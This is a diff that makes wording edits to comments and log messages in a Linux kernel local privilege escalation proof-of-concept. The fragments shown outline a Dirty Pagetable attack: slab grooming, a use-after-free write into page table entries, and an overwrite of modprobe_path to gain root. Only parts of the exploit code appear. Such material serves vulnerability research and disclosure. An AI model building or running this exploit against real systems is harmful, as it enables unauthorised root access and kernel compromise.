@@ -9,7 +9,7 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
- * This PoC performs the Dirty Pagetable attack for LPE.
+ * This PoC performs the Dirty Pagetable attack and gains LPE.
  *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
@@ -93,7 +93,7 @@ int act(int act_fd, int code, int n, char *args)
  *  - create new active slab, allocate objs_per_slab objects
  *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
  *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - create page table to reclaim the freed memory
+ *  - create a page table to reclaim the freed memory
  *  - perform uaf write using the dangling reference
  *  - change modprobe_path using the overwritten page table
  */
@@ -334,7 +334,7 @@ int main(void)
 	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
 	size_t modprobe_path_len = strlen(modprobe_path);
 
-	printf("[!] prepare pagetables infrastructure\n");
+	printf("[!] prepare the page table infrastructure\n");
 	prepare_tables();
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
@@ -404,20 +404,19 @@ int main(void)
 	}
 	/* Now current_n should point to the last element in the reserved slabs */
 	assert(reserved_from_n + i - 1 == current_n);
-	printf("[+] done, now go for pagetable\n");
+	printf("[+] done, now go for page table\n");
 
-	printf("[!] create pagetable to allocate freed memory\n");
+	printf("[!] create a page table to reclaim the freed memory\n");
 	for (unsigned long long i=0; i < ENTRIES_AMOUNT; i++) {
 		*(unsigned int*)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
 	}
-	printf("[+] done, vulnerable pagetable has been created\n");
-
+	printf("[+] done, vulnerable page table has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	printf("[+] attempting to overwrite pagetable entries. This may kill your kernel.\n");
+	printf("[+] attempting to overwrite page table entries. This may kill your kernel.\n");
 
 	long phys_addr = MODPROBE_ADDR_ALIGNED;
-	/* doing rewrite to change pagetable entries */
+	/* doing rewrite to change page table entries */
 	UAF_write(phys_addr, uaf_n, act_fd);
 	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
